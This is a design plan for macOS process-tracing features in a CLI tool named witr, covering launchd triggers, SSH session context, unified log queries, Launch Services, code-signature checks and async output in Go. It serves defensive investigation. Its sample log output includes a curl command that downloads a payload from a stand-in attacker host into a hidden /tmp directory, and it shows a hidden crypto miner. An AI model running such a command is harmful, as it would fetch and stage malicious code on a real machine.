# macOS Tracing Enhancements Plan

This document outlines planned enhancements to witr's process tracing capabilities for macOS.

## Design Goals

1. **Async streaming output** - Show basic info immediately, stream deeper insights as they complete
2. **Zero dependencies** - Use only built-in macOS tools
3. **Graceful degradation** - Work even if some queries fail

---

## Current Baseline

```
witr --pid 1234
├── Target resolution     ~5-20ms   (ps/lsof)
├── Ancestry chain        ~10-50ms  (ps per ancestor, typically 3-8 levels)
├── Source detection      ~1-5ms    (string matching)
├── Launchd info          ~50-100ms (launchctl + plist parse)
├── Resource context      ~20-50ms  (pmset, lsof)
└── Total                 ~100-250ms
```

---

## Proposed Enhancements

| Enhancement | Time | Async? | What It Adds |
|-------------|------|--------|--------------|
| Launchd triggers (deep) | +50-100ms | ✅ | Plist triggers, KeepAlive, WatchPaths |
| SSH session | +20-50ms | ✅ | Remote IP, user, login time |
| Unified Log query | +200-500ms | ✅ | Recent log entries for process |
| Launch Services | +30-50ms | ✅ | What app/URL opened this |
| Code signature | +50-100ms | ✅ | Signing identity, entitlements |

---

## Enhancement Details

### 1. Launchd Triggers (Deep)

**What it does:** Parses the plist file to show exactly *why* and *when* launchd starts/restarts this process.

**How:** `launchctl print` + parse `/Library/LaunchDaemons/*.plist`

**Example - nginx:**
```
Launchd Service:
  Label       : com.nginx.server
  Plist       : /Library/LaunchDaemons/com.nginx.server.plist
  Type        : Launch Daemon (system-wide)

  Triggers:
    • RunAtLoad      : Yes (starts at boot)
    • KeepAlive      : Yes (restarts if killed)
    • StartInterval  : (not set)

  Restart Policy:
    • ThrottleInterval : 10s (min time between restarts)
    • SuccessfulExit   : Restart even on clean exit
```

**Example - Spotlight indexer:**
```
Launchd Service:
  Label       : com.apple.metadata.mds
  Type        : Launch Daemon

  Triggers:
    • RunAtLoad      : Yes
    • KeepAlive      : Yes
    • WatchPaths     : /Volumes (restarts when drives mount)
    • QueueDirectories: /var/db/mds/queue (restarts when files appear)
```

**Example - scheduled backup:**
```
Launchd Service:
  Label       : com.company.backup
  Type        : Launch Agent (per-user)

  Triggers:
    • RunAtLoad      : No
    • StartCalendarInterval:
        Hour: 2, Minute: 0 (runs daily at 2:00 AM)
```

**Value:** Answers "why does this keep restarting?" or "why did this start at boot?"

---

### 2. SSH Session

**What it does:** If process was spawned through SSH, shows who connected from where.

**How:** `who -u`, `last`, parse TTY association

**Example - developer debugging:**
```
SSH Context:
  Origin      : SSH Session
  Remote IP   : 192.168.1.50
  Remote Host : macbook-pro.local
  User        : deploy
  Login Time  : 2025-01-02 14:32:15
  TTY         : ttys003
  Session Age : 45 minutes
```

**Example - suspicious process:**
```
SSH Context:
  Origin      : SSH Session
  Remote IP   : 185.234.xx.xx ⚠️ (foreign IP)
  User        : root ⚠️
  Login Time  : 2025-01-02 03:14:22 (odd hours)
  TTY         : ttys001

  Warning: Process spawned from external SSH session
```

**Example - not from SSH:**
```
SSH Context  : Not applicable (local process)
```

**Value:** Answers "who SSH'd in and ran this?" - critical for security investigations

---

### 3. Unified Log Query

**What it does:** Queries macOS's unified logging system for recent entries from/about this process.

**How:** `log show --predicate 'processID == <pid>' --last 5m`

**Example - crashing app:**
```
Recent Logs (last 5 min):
  14:32:01 [error]   nginx: bind() to 0.0.0.0:80 failed (48: Address already in use)
  14:32:01 [notice]  nginx: retrying in 500ms...
  14:32:02 [error]   nginx: bind() to 0.0.0.0:80 failed (48: Address already in use)
  14:32:02 [crit]    nginx: could not open error log, exiting

  ⚠️ 4 errors in last 5 minutes
```

**Example - successful service:**
```
Recent Logs (last 5 min):
  14:30:00 [notice]  postgres: database system is ready
  14:32:15 [info]    postgres: connection received from 127.0.0.1:52341
  14:32:15 [info]    postgres: connection authorized: user=app database=mydb

  ✓ No errors
```

**Example - security event:**
```
Recent Logs (last 5 min):
  03:14:22 [auth]    sshd: Accepted publickey for root from 185.234.xx.xx
  03:14:23 [notice]  sudo: root ran command /usr/bin/curl http://evil.com/payload
  03:14:24 [notice]  bash: downloaded file to /tmp/.hidden

  ⚠️ Suspicious activity detected
```

**Value:** Answers "what has this process been doing?" and "why did it crash?"

---

### 4. Launch Services

**What it does:** Shows what triggered an app launch - another app, URL scheme, file open, etc.

**How:** `lsappinfo info -only <pid>`, `lsof` for file associations

**Example - Safari opened by Slack:**
```
Launch Context:
  Launched By : Slack.app (pid 890)
  Trigger     : URL clicked in app
  URL         : https://company.slack.com/files/doc.pdf
  Time        : 14:32:01
```

**Example - Preview opened by Finder:**
```
Launch Context:
  Launched By : Finder.app (pid 234)
  Trigger     : File double-clicked
  File        : /Users/john/Documents/report.pdf
  Time        : 14:30:55
```

**Example - app opened via URL scheme:**
```
Launch Context:
  Launched By : Google Chrome (pid 567)
  Trigger     : URL Scheme
  URL         : zoom://meeting/123456789
  Time        : 14:28:00
```

**Example - app launched by system:**
```
Launch Context:
  Launched By : launchd (pid 1)
  Trigger     : Login Item
  Reason      : Added to Login Items by user
```

**Value:** Answers "how did this app get opened?" - useful for tracking malware spread

---

### 5. Code Signature

**What it does:** Verifies the binary's code signature and shows signing identity.

**How:** `codesign -dv --verbose=4`, `spctl -a -v`

**Example - Apple signed:**
```
Code Signature:
  Status      : ✓ Valid
  Signed By   : Software Signing (Apple)
  Authority   : Apple Root CA → Apple Code Signing → Software Signing
  Identifier  : com.apple.Safari
  Team ID     : (Apple)
  Notarized   : Yes (Apple System)
  Hardened    : Yes
  Entitlements:
    • com.apple.security.network.client
    • com.apple.security.files.user-selected.read-write
```

**Example - third-party signed:**
```
Code Signature:
  Status      : ✓ Valid
  Signed By   : Developer ID Application: Docker Inc (9BNSXJN65R)
  Authority   : Apple Root CA → Developer ID CA → Docker Inc
  Identifier  : com.docker.docker
  Team ID     : 9BNSXJN65R
  Notarized   : Yes
  Hardened    : Yes
```

**Example - unsigned binary:**
```
Code Signature:
  Status      : ⚠️ NOT SIGNED
  Path        : /tmp/.hidden/miner

  Warning: Unsigned binary - may be malicious
```

**Example - signature broken:**
```
Code Signature:
  Status      : ❌ INVALID
  Error       : code signature changed since signed
  Path        : /usr/local/bin/suspicious

  Warning: Binary modified after signing - possible tampering!
```

**Value:** Answers "is this binary legitimate?" and "has it been tampered with?"

---

## Summary Table

| Enhancement | Key Question It Answers |
|-------------|------------------------|
| Launchd (deep) | "Why does this keep starting/restarting?" |
| SSH session | "Who logged in remotely and ran this?" |
| Unified Log | "What has this process been doing? Any errors?" |
| Launch Services | "What app/file/URL triggered this to open?" |
| Code signature | "Is this binary legitimate and untampered?" |

---

## Async Streaming Architecture

### Current (Blocking)
```
[===== 300ms wait =====] → [full output]
```

### Proposed (Streaming)
```
[50ms] → Basic info appears
[+50ms] → Ancestry appears
[+100ms] → Launchd details stream in
[+150ms] → SSH session info streams in
```

### Implementation Concept

```go
// cmd/witr/main.go
func main() {
    // Phase 1: Immediate (blocking) - ~50ms
    pid := resolvePID(target)
    proc := readProcess(pid)
    ancestry := resolveAncestry(pid)
    source := detectSource(ancestry)

    // Print immediately
    renderBasicInfo(proc, ancestry, source)

    // Phase 2: Stream async results
    results := make(chan AsyncResult)

    go func() { results <- getLaunchdDetails(pid) }()
    go func() { results <- getSSHSession(proc.TTY) }()
    go func() { results <- getCodeSignature(proc.Exe) }()
    go func() { results <- queryUnifiedLog(pid) }()

    // Print each result as it arrives
    for i := 0; i < 4; i++ {
        result := <-results
        renderAsyncResult(result)
    }
}
```

---

## UX Options

### Option A: Progressive Append
Just keep printing new lines as data arrives:
```go
fmt.Println("Source      : launchd")
// ... async work ...
fmt.Println("              Type: Launch Daemon")  // appends
```
**Pros:** Simple, works everywhere
**Cons:** Can't update "⏳ Loading..." to "✓ Done"

### Option B: In-Place Updates
Use ANSI codes to update lines:
```go
fmt.Print("Source      : launchd ⏳")
// ... async work ...
fmt.Print("\rSource      : launchd ✓")  // overwrites
```
**Pros:** Cleaner UX, shows progress
**Cons:** More complex, needs terminal detection

**Recommendation:** Start with Option A (Progressive Append)

---

## Combined Example Output

```
$ witr suspicious_process --deep

Target      : suspicious_process (pid 4521)
User        : root ⚠️
Command     : /tmp/.hidden/miner --pool stratum://...
Started     : 3 hours ago

Why It Exists:
  launchd (pid 1) → sshd (pid 200) → bash (pid 4500) → suspicious_process (pid 4521)

Source      : shell (bash)

SSH Context:
  Remote IP   : 185.234.xx.xx ⚠️ (foreign IP)
  User        : root
  Login Time  : 03:14:22 (3 hours ago)

Code Signature:
  Status      : ⚠️ NOT SIGNED

Recent Logs:
  03:14:30 [notice]  Outbound connection to 185.234.xx.xx:3333
  03:15:01 [notice]  CPU usage: 95%

Launch Context:
  Launched By : bash (pid 4500)
  Trigger     : Command execution

Warnings:
  • Process running as root
  • Unsigned binary in /tmp
  • Spawned from foreign SSH session
  • High CPU usage
  • Suspicious directory: /tmp/.hidden
```

---

## CLI Flags

```bash
# Default: Fast (~150-300ms total)
witr nginx
# Includes: ancestry, source detection, basic launchd

# Deep: All enhancements (~500-800ms)
witr nginx --deep
# Adds: SSH session, code signature, unified logs, launch services

# Individual flags
witr nginx --logs      # Include unified log query
witr nginx --signature # Include code signature check
```

---

## Implementation Phases

### Phase 1: Code Signature
- `codesign -dv --verbose=4`
- `spctl -a -v` for notarization
- Parse entitlements

### Phase 2: SSH Session Detection
- Parse `who -u` output
- Match TTY to process
- Extract remote IP and login time

### Phase 3: Unified Log Integration
- `log show --predicate 'processID == <pid>' --last 5m`
- Parse JSON output
- Highlight errors and warnings

### Phase 4: Launch Services
- `lsappinfo info -only <pid>`
- Track parent app relationships
- Detect URL scheme launches

### Phase 5: Async Streaming
- Refactor output to support streaming
- Implement goroutine-based async queries
- Progressive rendering

---

## macOS Tools Used (All Built-in)

| Tool | Purpose |
|------|---------|
| `codesign` | Code signature verification |
| `spctl` | Gatekeeper/notarization check |
| `who` | Active login sessions |
| `last` | Login history |
| `log show` | Unified logging query |
| `lsappinfo` | Launch Services info |
| `launchctl` | Launchd service info |
| `plutil` | Plist parsing |

All tools are built into macOS - no external dependencies required.
